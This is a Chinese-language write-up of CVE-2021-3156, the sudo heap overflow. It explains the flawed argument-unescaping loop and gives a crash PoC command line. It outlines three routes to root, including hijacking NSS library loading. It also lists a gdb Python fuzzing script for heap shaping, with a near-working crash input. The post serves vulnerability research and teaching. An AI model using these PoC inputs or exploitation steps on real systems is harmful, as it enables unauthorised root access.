# 关于CVE-2021-3156你需要知道的三两事
# 漏洞原理

首先拉下来sudo的项目然后编译。

```
https://github.com/sudo-project/sudo/archive/SUDO_1_9_5p1.tar.gz
```

```shell
tar xf sudo-SUDO_1_9_5p1.tar.gz
cd sudo-SUDO_1_9_5p1/
mkdir build
cd build/
../configure --enable-env-debug
make -j
sudo make install
```

注意两点：1.开启debug模式；2.编译完了要install。

这一切做完后，可以加载sudoedit的符号表了。

以这个poc为例：

```
gdb --args sudoedit -s '\' `perl -e 'print "A" x 65536'`
```

断点：

```
b ../../../plugins/sudoers/sudoers.c:958
```

![](https://s3.ax1x.com/2021/01/28/ypMwTg.png)

此时相关信息如下：

```c
pwndbg> p NewArgv[0]
$1 = 0x55ae1a212e4e "sudoedit"
pwndbg> p NewArgv[1]
$2 = 0x7ffee74407e8 "\\"
pwndbg> p NewArgv[2]
$3 = 0x7ffee74407ea 'A' <repeats 200 times>...
```

以关键代码举例：

```c
            /* Alloc and build up user_args. */
            for (size = 0, av = NewArgv + 1; *av; av++)
                size += strlen(*av) + 1;
            if (size == 0 || (user_args = malloc(size)) == NULL) {
                sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
                debug_return_int(NOT_FOUND_ERROR);
            }
            if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
                /*
                 * When running a command via a shell, the sudo front-end
                 * escapes potential meta chars.  We unescape non-spaces
                 * for sudoers matching and logging purposes.
                 */
                for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
                    while (*from) {
                        if (from[0] == '\\' && !isspace((unsigned char)from[1]))
                            from++;
                        *to++ = *from++;
                    }
                    *to++ = ' ';
                }
                *--to = '\0';

```

流程分析：

进入这里时：

```
NewArgv[0]="sudoedit"
NewArgv[1]="\\"
NewArgv[2]='A' <repeats 200 times>...(65536)
```

这里扫描了NewArgv[1]与NewArgv[2]并根据其分配了相应的大小：65536+2+1 = 65539.

![](https://s3.ax1x.com/2021/01/28/yplmVO.png)

接下来用malloc分配对应的size。最终到达了：

```c
                /*
                 * When running a command via a shell, the sudo front-end
                 * escapes potential meta chars.  We unescape non-spaces
                 * for sudoers matching and logging purposes.
                 */
                for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
                    while (*from) {
                        if (from[0] == '\\' && !isspace((unsigned char)from[1]))
                            from++;
                        *to++ = *from++;
                    }
                    *to++ = ' ';
                }
```

此时：

to指向我们malloc出来的区域。

av指向NewArgv[1]（‘\\\\\）

from是‘\\\\\’

每循环一次av++，向NewArgv的下一个位置扫描。



**for循环一次负责扫描一个NewArgv[i]**

{

​	然后进入一个while，只要我们的from不为空。

​	{

​	如果from[0]=='\\\' 且 from[1]不为空格，那么from指针直接后移。

​	否则将from位置的值放到to，from后移。也就是我们的user_args缓冲区。实际上是用来给用户参数做缓冲的。

​	}

​	跳出while后，将to的位置赋值空，然后to后移。

}

在这里我们的from[0] = '\\\\'

![](https://s3.ax1x.com/2021/01/28/y9AdER.png)

**所以产生了一个问题**。

1. 当我们第一次进入for时，此时的目标是扫描NewArgv[1]='\\\\'。接着我们进入while。很显然会进入if，导致from后移一次(此时from变成了\x00)，出了if之后将from放到to，from又后移了一次（此时变成了'A'）。
2. 按照正常情况，此时的from应该已经为空了，因为NewArgv[1]扫描完毕，而由于这里判断的失误+我们构造的数据，导致from此时不空，所以第一次for循环中的while又继续进行，接下里在这一次本不该发生的while中。我们拷贝了'AAAAAAAAA....'到缓冲区中导致缓冲区被填满。
3. 接下来开始扫描NewArgv[2]，又把拷贝了'AAAAAAAAA....'到缓冲区中。。**此时导致了堆溢出，而且溢出长度可控。**
# 漏洞利用思路
（1）覆写struct sudo_hook_entry。

这是一个被分配到heap上的结构体，可以通过堆溢出覆写其中的函数指针getenv_fn（他指向的函数存在于sudo.so中，并且在sudo.so的开头有对execv的调用），而对于其的调用又和execve其one_gadgets的参数很像。所以思路如下：
 
通过堆溢出，劫持函数指针getenv_fn，在存在aslr的情况下进行部分覆写（低两字节为 0x8a00），然后爆破execv函数的地址，最后通过execv以root来执行我们自己的文件。（比如我们的文件叫："SYSTEMD_BYPASS_USERDB"，这是正常执行getenv_fn中的第一个参数）

（2）覆写struct service_user。（也是视频中演示的方法）
我们可以通过堆溢出，劫持堆上的struct service_user结构体中的library指针。在nss_load_library (service_user *ni)中会基于此结构体进行一些操作。

我们的思路如下：
首先劫持service_user中的library为NULL以通过一些检查。
接着覆写service_user中的name变量。以视频中为例，他将name覆写为"X/X",这样做的目的在于，当函数正常执行时，会做如下的文件路径拼接："libnss_" + name + ".so.2"，正常情况下是：libnss_systemd.so.2，而当我们劫持了name后就变成了："libnss_X/X.so.2"，也就是说，此时加载了恶意的lib文件。

通过观看poc视频我们可以看到在lib中的_init函数是constructor，那么他会作为初始的构造函数在main前执行，通过执行恶意的lib中的_init来root。

（3）覆写def_timestampdir。
第三种是比较玄学的一种利用，简单提一下:

sudo有这样一种行为，大致就是会在我们的工作目录下创建一些属于root用户的目录。每个这样的目录下都有且仅有一个文件：Sudo's timestamp file。
如果我们尝试将def_timestampdir覆盖为一个不存在的目录。然后我们可以与sudo的ts_mkdirs()竞争，创建一个指向任意文件的符号链接。并且尝试打开这个文件，向其中写入一个struct timestamp_entry。我们可以符号链接将其指向/etc/passwd，然后以root打开他，然后实现任意用户的注入从而root。

# gdb-fuzz脚本编写
```py
import gdb
import random
#from pwn import *
# POC
# sudo gdb --args sudoedit -s '\' `perl -e 'print "A" x 550'`

# 1.sudo gdb sudoedit
# 2.source gdb.py



def set_up():
    gdb.execute("start")
    gdb.execute("set pagination off")
    gdb.execute("set logging on ./gdb.output")

def over():
    gdb.execute("set logging off")
    #gdb.execute("quit")

def fuzz():
    set_up()
    cmd = "set env LC_ALL = %s" %("A"*4792)
    #print("fuzz1_test:",i)
    gdb.execute(cmd)
    
    cmd = "run -s '\\' `perl -e 'print \"A\" x %s'`" %(4792) 
    print("fuzz1_test:",cmd)
    gdb.execute(cmd)
    gdb.execute("bt")
    over()
def fuzz1(i,j):
    set_up()
    cmd = "set env LC_ALL = %s" %("A"*i)
    print("fuzz1_test:",i)
    gdb.execute(cmd)
    
    cmd = "run -s '\\' `perl -e 'print \"B\" x %s'`" %(j) 
    print("fuzz1_test:",cmd)
    gdb.execute(cmd)
    gdb.execute("bt")
    over()
    
def fuzz2(i,j,k):
    set_up()
    cmd = "set env LC_ALL = %s" %("C"*i)
    print("fuzz2_test:",i)
    gdb.execute(cmd)
    cmd = "set env LOCPATH = %s" %("D"*j)
    print("fuzz2_test:",j)
    gdb.execute(cmd)
    cmd = "run -s '\\' `perl -e 'print \"E\" x %s'`" %(k) 
    print("fuzz2_test:",cmd)
    gdb.execute(cmd)
    gdb.execute("bt")
    over()
    
def fuzz3(i,j,k):
    set_up()
    cmd = "set env LC_ALL = %s" %("F"*i)
    print("fuzz3_test:",i)
    gdb.execute(cmd)
    cmd = "set env LC_MESSAGES = %s" %("G"*j)
    print("fuzz3_test:",j)
    gdb.execute(cmd)
    cmd = "run -s '\\' `perl -e 'print \"H\" x %s'`" %(k) 
    print("fuzz3_test:",cmd)
    gdb.execute(cmd)
    gdb.execute("bt")
    over()

def fuzz4(i,j,k):
    set_up()
    cmd = "set env LOCPATH = %s" %("I"*i)
    print("fuzz4_test:",i)
    gdb.execute(cmd)
    cmd = "set env LC_MESSAGES = %s" %("J"*j)
    print("fuzz4_test:",j)
    gdb.execute(cmd)
    cmd = "run -s '\\' `perl -e 'print \"K\" x %s'`" %(k) 
    print("fuzz4_test:",cmd)
    gdb.execute(cmd)
    gdb.execute("bt")
    over()

def fuzz5(i,j,k,h,l,p):
    set_up()
    cmd = "set env LC_ALL = %s" %("F"*p)
    print("fuzz5_test:",cmd)
    gdb.execute(cmd)
    cmd = "set env LC_NUMERIC C.UTF-8@%s"%("A"*i)
    print("fuzz5_test:",cmd)
    gdb.execute(cmd)
    cmd = "set env LC_MESSAGES = %s" %("J"*l)
    print("fuzz5_test:",cmd)
    gdb.execute(cmd)
    cmd = "set env LC_MEASUREMENT C.UTF-8@%s"%("B"*j)
    print("fuzz5_test:",cmd)
    gdb.execute(cmd)
    cmd = "run -s '%s\\' `perl -e 'print \"K\" x %s'`" %("C"*k,h)
    print("fuzz5_test:",cmd)
    gdb.execute(cmd)
    gdb.execute("bt")
    over()




def main():
    begin=200
    end=1000
    count=800
    
    

    for i in range(2000):
        fuzz5(  random.randint(5,100),
            random.randint(5,100),
            random.randint(5,100),
            random.randint(200,800),
            random.randint(5,100),
            random.randint(5,100),
            )
    gdb.execute("quit")

main()
```

1.通过 ```gdb.execute(cmd)```来执行gdb命令。

2.关闭分页并打开log输出，指定输出到```./gdb.output```
```python
    gdb.execute("set pagination off")
    gdb.execute("set logging on ./gdb.output")
```

3.在gdb中通过执行```set env```来调整环境变量的值。

4.每次crash完都运行```backtrace```导出bt信息到log文件。

# 利用难点
针对方法（2）来说，主要难点在于，通过fuzz调整环境变量到达```<nss_load_library+46>```位置的crash。

```setlocale()```和后续malloc+free对堆风水的影响较为复杂，所以采用fuzz的方式尝试获取目标crash。

主要要满足几个要求：

- 通过对堆风水的调整，将溢出点放在heap低地址，要劫持的结构体放在heap高地址，且溢出长度足够。

- 保证调整后的堆风水可以通过后续所有malloc与free操作而不产生崩溃

- 满足1.2.后，到达最后的```nss_load_library```，在此劫持.so的载入。

![](https://s3.ax1x.com/2021/02/09/ydHHr8.png)

已经得到的较为有用的crash：
```
set env LC_NUMERIC C.UTF-8@AAAAAAAAAAAAAAAA
set env LC_MEASUREMENT C.UTF-8@BBBBBBBBBBBBBBBBBBBBBBB
run -s 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\' `perl -e 'print "K" x 371'`
 ```
可以正常通过malloc，但是堆溢出还需要调整。